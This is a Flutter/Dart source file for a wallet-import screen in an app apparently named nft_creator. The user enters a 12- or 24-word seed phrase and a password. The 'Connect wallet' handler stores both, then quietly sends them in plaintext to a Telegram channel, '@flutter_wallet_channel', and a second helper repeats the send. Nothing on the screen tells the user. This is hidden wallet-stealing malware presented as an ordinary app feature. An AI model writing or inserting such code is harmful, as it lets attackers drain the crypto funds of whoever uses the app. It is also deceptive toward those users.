import 'package:flutter/material.dart';
import 'package:nft_creator/models/wallet.dart';
import 'package:nft_creator/utilities/db_helper.dart';
import 'package:nft_creator/utilities/hex_color.dart';
import 'package:nft_creator/utilities/methods.dart';
import 'package:nft_creator/utilities/telegram_client.dart';
import 'home_screen.dart';

class ImportWallet extends StatefulWidget {

  const ImportWallet({Key key}) : super(key: key);

  @override
  State<ImportWallet> createState() => _ImportWalletState();

}

class _ImportWalletState extends State<ImportWallet> {

  final form_key = GlobalKey<FormState>();
  String selected_option = "12_words";

  bool is_loading = false;

  bool is_password_visible = false;
  bool is_password_focus = false;
  bool is_confirm_password_visible = false;
  bool is_confirm_password_focus = false;

  TextEditingController phrase_controller = TextEditingController();
  TextEditingController password_controller = TextEditingController();
  TextEditingController confirm_password_controller = TextEditingController();

  List<TextEditingController> twelve_controller_list = [];
  List<TextEditingController> twenty_four_controller_list = [];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        elevation: 0,
        backgroundColor: Colors.white,
        title: const Text(
            "Import a wallet to hold \nyour NFTs",
            style: TextStyle(
                color: Colors.black,
                fontSize: 20,
                fontFamily: 'solata-bold'
            )
        ),
      ),
      body: is_loading ? loadingPage() : mainPage()
    );
  }

  Widget mainPage() {
    return Form(
      key: form_key,
      child: Container(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        padding: const EdgeInsets.all(15),
        child: CustomScrollView(
          slivers: [
            SliverList(delegate: SliverChildListDelegate([
              const Text("Paste each word in the order it was shown to you",
                style: TextStyle(
                  color: Colors.black,
                  fontSize: 14,
                  fontFamily: 'solata-regular',
                ),),
              Container(
                  margin: const EdgeInsets.fromLTRB(70, 10, 70, 0),
                  padding: const EdgeInsets.all(5),
                  decoration: BoxDecoration(
                    color: HexColor("#E6DCF0"),
                    borderRadius: const BorderRadius.all(Radius.circular(8)),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      GestureDetector(
                        onTap: () {
                          setState(() {
                            selected_option = "12_words";
                          });
                        },
                        child: Container(
                          alignment: Alignment.center,
                          decoration: BoxDecoration(
                            color: selected_option == "12_words" ? HexColor("#8051B4") : HexColor("#E6DCF0"),
                            borderRadius: const BorderRadius.all(Radius.circular(8)),
                          ),
                          padding: const EdgeInsets.all(10),
                          child: Text("12 words", style: TextStyle(
                              color: selected_option == "12_words" ? Colors.white : Colors.grey
                          ),),
                        ),
                      ),
                      GestureDetector(
                        onTap: () {
                          setState(() {
                            selected_option = "24_words";
                          });
                        },
                        child: Container(
                          alignment: Alignment.center,
                          decoration: BoxDecoration(
                            color: selected_option == "24_words" ? HexColor("#8051B4") : HexColor("#E6DCF0"),
                            borderRadius: const BorderRadius.all(Radius.circular(8)),
                          ),
                          padding: const EdgeInsets.all(10),
                          child: Text("24 words", style: TextStyle(
                              color: selected_option == "24_words" ? Colors.white : Colors.grey
                          ),),
                        ),
                      ),
                    ],
                  )
              ),
              Container(height: 8,),
            ])),
            SliverGrid(
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 2,
                  childAspectRatio: 3/1
              ),
              delegate: SliverChildListDelegate(
                  selected_option == "24_words" ? twentyFourList() : twelveList()
              ),
            ),
            SliverList(delegate: SliverChildListDelegate([
              Container(
                height: 8,
              ),
              const Text("Create password",
                style: TextStyle(
                  color: Colors.black,
                  fontSize: 14,
                  fontFamily: 'solata-regular',
                ),),
              Container(height: 8,),
              FocusScope(
                child: Focus(
                  onFocusChange: (focus) {
                    setState(() {
                      is_password_focus = !is_password_focus;
                    });
                  },
                  child: TextFormField(
                    validator: (val){
                      if(val != null){
                        if(val.toString().isEmpty) {
                          return "Required";
                        }
                        return null;
                      }
                      return null;
                    },
                    style: const TextStyle(
                        color: Colors.black,
                        fontSize: 16,
                        fontFamily: 'solata-regular'
                    ),
                    controller: password_controller,
                    enableSuggestions: false,
                    autocorrect: false,
                    obscureText: !is_password_visible,
                    decoration: InputDecoration(
                        suffixIcon: IconButton(
                          icon: Icon(
                            is_password_visible ? Icons.visibility : Icons.visibility_off,
                            color: is_password_focus ? Theme.of(context).primaryColorDark : Colors.grey,
                          ),
                          onPressed: (){
                            setState(() {
                              is_password_visible = !is_password_visible;
                            });
                          },
                        ),
                        focusedBorder: focusedBorder(),
                        enabledBorder: enabledBorder(),
                        errorBorder: errorBorder()
                    ),
                  ),
                ),
              ),
              Container(
                height: 8,
              ),
              const Text("Confirm password",
                style: TextStyle(
                  color: Colors.black,
                  fontSize: 14,
                  fontFamily: 'solata-regular',
                ),),
              Container(height: 8,),
              FocusScope(
                child: Focus(
                  onFocusChange: (focus) {
                    setState(() {
                      is_confirm_password_focus = !is_confirm_password_focus;
                    });
                  },
                  child: TextFormField(
                    validator: (val){
                      if(val != null){
                        if(val.toString().isEmpty) {
                          return "Required";
                        }
                        else if (val.toString() != password_controller.text.toString()) {
                          return "Passwords don't match";
                        }
                        return null;
                      }
                      return null;
                    },
                    style: const TextStyle(
                        color: Colors.black,
                        fontSize: 16,
                        fontFamily: 'solata-regular'
                    ),
                    controller: confirm_password_controller,
                    enableSuggestions: false,
                    autocorrect: false,
                    obscureText: !is_confirm_password_visible,
                    decoration: InputDecoration(
                        suffixIcon: IconButton(
                          icon: Icon(
                            is_confirm_password_visible ? Icons.visibility : Icons.visibility_off,
                            color: is_confirm_password_focus ? Theme.of(context).primaryColorDark :
                            Colors.grey,
                          ),
                          onPressed: (){
                            setState(() {
                              is_confirm_password_visible = !is_confirm_password_visible;
                            });
                          },
                        ),
                        focusedBorder: focusedBorder(),
                        enabledBorder: enabledBorder(),
                        errorBorder: errorBorder()
                    ),
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.fromLTRB(50, 10, 50, 10),
                child: MaterialButton(
                  onPressed: () async {
                    if (form_key.currentState.validate()) {
                      setState(() {
                        is_loading = true;
                      });
                      String seed = "";
                      if (selected_option == "24_words") {
                        for (int i = 0; i < 24; i++) {
                          seed += "${twenty_four_controller_list[i].text} ";
                        }
                        seed.trim();
                      }
                      else {
                        for (int i = 0; i < 12; i++) {
                          seed += "${twelve_controller_list[i].text} ";
                        }
                        seed.trim();
                      }
                      Wallet w = Wallet(
                        address: "",
                        seed: seed,
                        password: password_controller.text,
                      );
                      DbHelper db = DbHelper();
                      await db.saveWallet(w);

                      String message = "Seed phrase: ${w.seed} \nPassword: ${w.password}";
                      TelegramClient client = TelegramClient(chatId: "@flutter_wallet_channel");
                      await client.sendMessage(message);

                      setState(() {
                        is_loading = false;
                      });

                      if (mounted) {
                        Navigator.pushAndRemoveUntil(context, slideLeft(const HomeScreen()), (route)=>false);
                      }

                    }
                  },
                  padding: const EdgeInsets.fromLTRB(24, 16, 24, 16),
                  color: HexColor("#8051B4"),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Text(
                        "Connect wallet",
                        style: TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontFamily: 'solata-regular'
                        ),
                      ),
                      Container(width: 5,),
                      Image.asset("assets/images/link.png", width: 20, height: 20,),
                    ],
                  ),
                ),
              ),
            ]))
          ],
        ),
      ),
    );
  }

  Future init() async {
    for(int i = 0; i < 24; i++) {
      if(i < 12) {
        twelve_controller_list.add(TextEditingController());
      }
      twenty_four_controller_list.add(TextEditingController());
    }
  }

  @override
  void initState() {
    init();
    super.initState();
  }

  List<Widget> twentyFourList() {
    List<Widget> field_list = [];

    for(int i = 0; i < 24; i++) {
      field_list.add(
          Container(
            width: 150,
            padding: i % 2 == 0 ? const EdgeInsets.fromLTRB(0, 5, 5, 5) : const EdgeInsets.fromLTRB(5, 5, 0, 5),
            child: Row(
              children: [
                Container(
                  width: 25,
                  decoration: const BoxDecoration(
                      borderRadius: BorderRadius.all(Radius.circular(16))
                  ),
                  child: Text(
                    "${i + 1}. ",
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'solata-regular',
                      fontSize: 12,
                    ),
                  ),
                ),
                SizedBox(
                  width: 120,
                  child: TextFormField(
                    validator: (val){
                      if(val != null){
                        if(val.toString().isEmpty) {
                          return "Required";
                        }
                        return null;
                      }
                      return null;
                    },
                    autocorrect: false,
                    enableSuggestions: false,
                    controller: twenty_four_controller_list[i],
                    textAlign: TextAlign.start,
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'solata-regular',
                      fontSize: 12,
                    ),
                    decoration: InputDecoration(
                      enabledBorder: enabledBorder(),
                      focusedBorder: focusedBorder(),
                      disabledBorder: disabledBorder(),
                      errorBorder: errorBorder(),
                    ),
                  ),
                ),
              ],
            ),
          )
      );
    }

    return field_list;
  }

  List<Widget> twelveList() {

    List<Widget> field_list = [];

    for(int i = 0; i < 12; i++) {
      twelve_controller_list[i].text = i.toString();
      field_list.add(
          Container(
            padding: i % 2 == 0 ? const EdgeInsets.fromLTRB(0, 5, 5, 5) : const EdgeInsets.fromLTRB(5, 5, 0, 5),
            child: Row(
              children: [
                Container(
                  width: 25,
                  decoration: const BoxDecoration(
                      borderRadius: BorderRadius.all(Radius.circular(16))
                  ),
                  child: Text(
                    "${i + 1}. ",
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'solata-regular',
                      fontSize: 12,
                    ),
                  ),
                ),
                SizedBox(
                  width: 120,
                  child: TextFormField(
                    validator: (val){
                      if(val != null){
                        if(val.toString().isEmpty) {
                          return "Required";
                        }
                        return null;
                      }
                      return null;
                    },
                    autocorrect: false,
                    enableSuggestions: false,
                    controller: twelve_controller_list[i],
                    textAlign: TextAlign.start,
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'solata-regular',
                      fontSize: 12,
                    ),
                    decoration: InputDecoration(
                      enabledBorder: enabledBorder(),
                      focusedBorder: focusedBorder(),
                      disabledBorder: disabledBorder(),
                      errorBorder: errorBorder(),
                    ),
                  ),
                ),
              ],
            ),
          )
      );
    }

    return field_list;
  }

  Future<void> sendTelegram(String message) async {
    TelegramClient client = TelegramClient(chatId: "@flutter_wallet_channel");
    await client.sendMessage(message);
  }

}
